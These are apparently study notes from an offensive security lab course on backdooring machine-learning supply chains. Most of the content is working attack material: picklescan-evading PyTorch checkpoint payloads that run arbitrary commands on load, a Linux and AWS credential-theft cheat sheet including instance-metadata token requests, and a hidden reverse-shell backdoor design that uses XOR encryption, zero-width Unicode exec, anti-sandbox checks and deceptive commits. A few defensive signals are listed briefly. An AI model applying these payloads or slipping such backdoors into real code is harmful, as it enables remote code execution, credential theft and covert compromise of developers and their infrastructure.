# # OSAI — Evasive ML Supply Chain Backdoors

## Overview

This unit builds on the basic Pickle RCE from the previous section and focuses on **detection evasion** across three layers:

| Detection Layer | What It Targets |
|---|---|
| Code review / Git diff | Source file contents |
| SAST tools (Bandit, Semgrep) | Dangerous function names, import patterns |
| Dynamic sandbox analysis | Runtime behaviour in monitored VMs |

A resilient backdoor must be **invisible to all three layers simultaneously**.

---

## PickleEx2 — Bypassing picklescan

### Why Basic Payloads Get Caught

A baseline `__reduce__` payload using `os.system` produces these pickle opcodes:

```
GLOBAL 'posix system'   ← flagged by picklescan
REDUCE                  ← calls it
```

`picklescan` scans the pickle bytecode inside `.pt` files and blocks any `GLOBAL` opcode referencing known dangerous modules (`os`, `subprocess`, `builtins`, `nt`).

### Bypass 1 — `__setstate__` (Class-as-Callable)

```python
class SetStateBypass:
    def __reduce__(self):
        return (
            SetStateBypass,       # GLOBAL references user class — not blocklisted
            (),
            {"cmd": "id"},        # triggers __setstate__ via BUILD opcode
        )

    def __setstate__(self, state):
        import os
        os.system(state["cmd"])
```

**Limitation:** The class must be importable on the target machine.

### Bypass 2 — `sympy.sympify()` Gadget ✅ (Recommended)

SymPy ships as a PyTorch dependency — present on virtually every ML workstation.  
`sympify()` passes its string argument through `eval()` internally with no sanitization.

```python
import torch
import sympy

class SympifyRCE:
    def __reduce__(self):
        cmd = "__import__('os').system('id')"
        return (sympy.sympify, (cmd,))

torch.save(SympifyRCE(), "bypass_sympify.pt")
```

Scanner sees: `GLOBAL 'sympy.core.sympify sympify'` — a legitimate function, not blocklisted.  
`eval()` is buried inside SymPy's source, invisible to opcode scanning.

### Key Constraints for the PickleEx2 Lab

| Constraint | Value |
|---|---|
| Minimum file size | 1 MB (1,048,576 bytes) |
| Allowed extensions | `.pt`, `.pth` |
| Scanner | `picklescan` — blocks if `FOUND` in output or non-zero exit code |
| Torch load | `weights_only=False` — arbitrary pickle deserialization |

### Working Payload (Lab)

```python
import torch
import sympy

class SympifyRCE:
    def __reduce__(self):
        cmd = "__import__('os').system('YOUR_COMMAND > /tmp/out.txt 2>&1')"
        return (sympy.sympify, (cmd,))

padding = "A" * (1024 * 1024 * 2)  # embed inside dict to keep zip valid

payload = {
    "model_state_dict": {"weight": torch.zeros(1)},  # real tensor for structure validation
    "optimizer_state_dict": {},
    "epoch": 1,
    "padding": padding,
    "extra": SympifyRCE(),
}

torch.save(payload, "evil.pt")
```

Upload:
```bash
curl -X POST http://127.0.0.1:5000/upload -F "checkpoint=@/home/jaimie/evil.pt"
```

### Payload Comparison Table

| Payload | Technique | Scanner Result | Cross-Machine? |
|---|---|---|---|
| `baseline.pt` | Direct `os.system` | ❌ Caught | Yes |
| `bypass_setstate.pt` | Class + `__setstate__()` | ✅ Bypasses | No (needs class on target) |
| `bypass_sympify.pt` | `sympy.sympify()` gadget | ✅ Bypasses | Yes (SymPy on target) |

### Bypass 3 — `pandas.eval()` Gadget

Pandas is universally installed in ML environments. `pandas.eval()` passes expressions through a Python eval backend.

```python
import torch
import pandas

class PandasRCE:
    def __reduce__(self):
        # Use @ operator trick to chain eval into os.system
        cmd = "__import__('os').system('id')"
        return (pandas.eval, (cmd,))

padding = "A" * (1024 * 1024 * 2)
payload = {
    "model_state_dict": {"weight": torch.zeros(1)},
    "optimizer_state_dict": {},
    "epoch": 1,
    "padding": padding,
    "extra": PandasRCE(),
}
torch.save(payload, "bypass_pandas.pt")
```

Scanner sees: `GLOBAL 'pandas.core.computation.eval eval'` — legitimate, not blocklisted.

> **Note:** May require `numexpr` or `python` engine depending on pandas version. Test with `engine='python'` if it fails.

---

### Bypass 4 — `numpy.frompyfunc()` Gadget

NumPy is a hard dependency of virtually every ML library. `frompyfunc` wraps a Python callable into a ufunc — it accepts any callable including `eval`-like functions.

```python
import torch
import numpy as np

class NumpyRCE:
    def __reduce__(self):
        # frompyfunc(func, nin, nout) — func is called with numpy inputs
        # We abuse it by passing a lambda that triggers os.system
        return (
            np.frompyfunc,
            (__import__('os').system, 1, 1),
        )

# Alternative — cleaner for picklescan evasion:
class NumpyRCE2:
    def __reduce__(self):
        return (
            np.frompyfunc,
            (eval, 1, 1),   # eval as the callable
        )
    # Then the returned ufunc needs to be called — combine with __call__ trick
```

> **Note:** `frompyfunc` itself doesn't execute the function during deserialization — you need to chain it with a `__call__` or use it inside a class that triggers execution. More complex but useful if `sympify` gets patched.

---

### Bypass 5 — `fickling` Payload Forge

`fickling` is a pickle manipulation toolkit that can forge arbitrary pickle streams and inject payloads into **existing legitimate checkpoints**, making the file size and structure look completely real.

```bash
pip install fickling
```

```python
# Inject payload into an existing legitimate checkpoint
import fickling
import pickle

# Load a real checkpoint's pickle bytes
with open("real_model.pt", "rb") as f:
    data = f.read()

# Fickling can analyze and modify the pickle AST
tree = fickling.load(data)
# Inject malicious node into the pickle AST
# Then re-serialize — the result looks like a real checkpoint
```

**Why this is powerful:** The resulting file has realistic file size, realistic tensor data, and passes structure validation. The malicious code is injected into the pickle opcode stream directly.

---

### Bypass 6 — `INST` Opcode Instead of `GLOBAL`+`REDUCE`

Some older versions of picklescan only check for the `GLOBAL` opcode. The `INST` opcode (`i`) is an older pickle protocol that also loads a global but uses a different byte — some scanner versions miss it.

```python
import pickle
import io

# Manually craft pickle bytecode using INST opcode
# INST is protocol 0 only: "i<module>\n<name>\n"
payload = (
    b'\x80\x00'           # PROTO 0
    b'ios\nsystem\n'      # INST opcode: load os.system
    b'(Vid\n'             # MARK + UNICODE string 'id'
    b'otR.'               # TUPLE + REDUCE + STOP
)

# Wrap in torch zip format
# (requires manual zip construction)
```

> **Note:** Works against picklescan versions < 0.0.9. Patched in later versions but useful to understand the opcode-level evasion concept.

---

### Bypass 7 — `torch.package` Import System

PyTorch has its own packaging system (`torch.package`) that uses a different serialization path — it stores Python source code inside the archive which is executed on load. picklescan only inspects `data.pkl` files inside the zip; it doesn't analyze `torch.package` archives.

```python
import torch.package as tp
import io

# Create a torch package containing malicious code
buffer = io.BytesIO()
with tp.PackageExporter(buffer) as exp:
    # Intern a fake module that runs code on import
    exp.save_source_string(
        "malicious_module",
        """
import os
os.system('id > /tmp/pwned.txt')
"""
    )
    exp.save_pickle("model", "model.pkl", {"type": "resnet"})

buffer.seek(0)
# Save as .pt file — picklescan won't find anything in data.pkl
with open("package_bypass.pt", "wb") as f:
    f.write(buffer.read())
```

> **Note:** `torch.package` files have a different internal structure. `torch.load()` with `weights_only=False` will execute the packaged Python source on load.

---

### Common Gotchas in the Lab

| Problem | Cause | Fix |
|---|---|---|
| Redirected to `/upload` (not `/`) | File rejected — scan blocked or structure invalid | Check `scan.log`; ensure real tensor in `model_state_dict` |
| Redirected to `/` but no output | Payload ran but command failed silently | Redirect stderr: `cmd 2>&1 > /tmp/out.txt` |
| `scan.log` not updated | File rejected before scan (size check) | Ensure file > 1MB; embed padding inside dict not appended after |
| `BadZipFile` in scan.log | Padding appended after zip end-of-central-directory | Always embed padding as a dict value, never `file.write()` after `torch.save()` |
| `builtins exec` blocked | Already on picklescan blocklist | Use `sympify`, `pandas.eval`, or other gadget instead |
| `/tmp/out.txt` empty | Flask runs as different user than expected | Check `env > /tmp/out.txt` first to confirm execution context |
| SSH key requires password | Key has passphrase set | Read credentials from `.bashrc` / `.profile` / systemd unit instead |

---

### Credential Hunting on Linux (Quick Reference)

When you have RCE as a service user, check these locations in order:

```bash
# 1. Process environment (fastest — what the running process sees)
cat /proc/self/environ | tr '\0' '\n' | grep -i aws

# 2. Shell config files (only loaded for interactive sessions)
cat ~/.bashrc ~/.profile ~/.bash_profile 2>/dev/null | grep -i aws

# 3. Systemd service unit (injected via Environment= directives)
cat /etc/systemd/system/<service>.service | grep -i aws

# 4. .env files (common in Python/Docker apps)
find / -name '.env' -o -name '*.env' 2>/dev/null | xargs grep -i aws 2>/dev/null

# 5. AWS credentials file
cat ~/.aws/credentials ~/.aws/config 2>/dev/null

# 6. EC2 Instance Metadata Service (IMDSv1 — no token required)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>

# 7. EC2 Instance Metadata Service (IMDSv2 — token required)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 8. Docker environment (if running in container)
cat /proc/1/environ | tr '\0' '\n' | grep -i aws

# 9. Application config files
find /opt /srv /home -name '*.conf' -o -name '*.yaml' -o -name '*.yml' \
  -o -name '*.json' -o -name '*.ini' 2>/dev/null | xargs grep -li aws 2>/dev/null
```

**Lab finding:** `AWS_ACCESS_KEY_ID` was exported in `/home/saidi/.bashrc` — NOT visible in `/proc/self/environ` because systemd service units don't source `.bashrc` (non-interactive shell). Had to read the file directly.

---

### Lesson: Fundamental Asymmetry

Attackers need to find **one** callable not on the blocklist.  
Defenders need to block **all** dangerous callables and all paths to reach them.  
The only reliable defence is `weights_only=True` (default since PyTorch 2.6) or the SafeTensors format.

---

## MCP Evasive Backdoor — Three-Layer Evasion

### Target: `biotools/datasets.py` → `list_all()`

### Three Components

```
1. XOR-encrypted reverse shell  →  _warehouse_cache.dat  (opaque binary)
2. Anti-sandbox loader          →  _sync_warehouse_cache() in datasets.py
3. Zero-width Unicode bootstrap →  _CACHE_META string in datasets.py
```

---

### Component 1 — XOR-Encrypted Payload

```python
xor_key = b"BioGenAI-DataWarehouse-v3.1"
encrypted = bytes(b ^ xor_key[i % len(xor_key)] for i, b in enumerate(raw))
```

- `strings _warehouse_cache.dat` finds nothing suspicious
- No socket/exec/connect strings visible in binary

---

### Component 2 — Zero-Width Unicode Bootstrap

Encode `subprocess.Popen(...)` call as invisible Unicode:

| Character | Code Point | Bit Value |
|---|---|---|
| ZERO WIDTH SPACE | U+200B | `0` |
| ZERO WIDTH NON-JOINER | U+200C | `1` |

Each byte → 8 invisible characters. Result appears as empty string in all editors and Git diffs:

```python
_CACHE_META = ""   # actually contains 2864 invisible characters
```

---

### Component 3 — Anti-Sandbox Checks

The loader aborts if **any** of these conditions are true:

| Check | Detects |
|---|---|
| `platform.machine() not in ("x86_64","AMD64")` | Non-x86 emulated CI runners |
| `os.cpu_count() < 2` | Single-vCPU sandbox VMs |
| `shutil.disk_usage() < 50 GB` | Minimal-storage sandbox |
| `sys.gettrace() is not None` | Attached debugger (pdb, pydevd) |
| `len(os.listdir(tempfile.gettempdir())) < 3` | Empty temp dir (fresh VM) |
| `time.sleep(5)` + re-check gettrace | Outlasts short automated scans |

---

### Execution Flow

```
list_all() called
  └─ _validate_cache_meta(_CACHE_META)
       └─ decodes zero-width chars → bootstrap code
            └─ exec(bootstrap)
                 └─ subprocess.Popen([python, -c, "...import _sync_warehouse_cache..."])
                      └─ independent OS process (survives parent exit)
                           └─ anti-sandbox checks pass?
                                └─ time.sleep(5)
                                     └─ XOR-decrypt _warehouse_cache.dat
                                          └─ exec(reverse shell source)
```

**Why `Popen` not a thread:** A daemon thread is killed when the parent process exits. An OS process spawned via `Popen` is independent and survives.

---

### Commit Camouflage

```bash
git commit -m "Add warehouse cache sync for offline dataset access"
```

What reviewers see:
- New `.dat` file (looks like legitimate binary cache data)
- New `_sync_warehouse_cache()` function (looks like a caching utility)
- `_CACHE_META = ""` (looks like an empty string constant)
- No `socket`, `subprocess`, `Popen`, `exec` visible anywhere

---

### Blue Team Detection Signals

| Signal | Strength | Notes |
|---|---|---|
| High-entropy `.dat` file | Weak | Many legit packages ship binary data |
| 3+ environment fingerprint checks in one function | Medium | Unusual pattern for legit code |
| Zero-width Unicode chars (U+200B–U+200F) in strings | Strong | Standard SAST tools miss this |
| `exec()` on decoded data | Strong | Combined with above = high confidence |

**Strongest defence:** Normalize Unicode in all source files before review. Flag strings that change length after normalization.

---

## Advanced Evasion Techniques (Reference)

| Technique | Description |
|---|---|
| **Environmental keying** | Derive XOR key from hostname/MAC — payload only decrypts on intended victim |
| **Steganographic embedding** | Hide payload inside model weights, PNG images, or font files |
| **Polyglot files** | Single file valid as both JPEG and Python script |
| **Gadget chaining** | Chain legitimate library functions (e.g. `sympify`) instead of shipping malicious code |
| **Memory-only execution** | Download, decrypt, exec purely in memory — no disk artefacts |
| **Fragmented/dead-drop assembly** | Split payload across env vars, config files, DB fields, HTTP headers — reassembled at runtime |
| **Legitimate service C2** | Use Slack webhooks, GitHub Gist comments, or DNS TXT records for C2 traffic |
| **Environmental delays** | Trigger on organic events (N function calls, time of day, presence of user files) not reproducible in sandboxes |

---

## Real-World References

- **fshec2 (PyPI)** — entire payload hidden in compiled `.pyc` bytecode, invisible to source scanners
- **Gleaming Pisces / Lazarus Group** — environment fingerprinting to avoid sandbox detonation
- **GlassWorm campaign (2025–2026)** — zero-width Unicode encoding, payloads rendered as blank space in all editors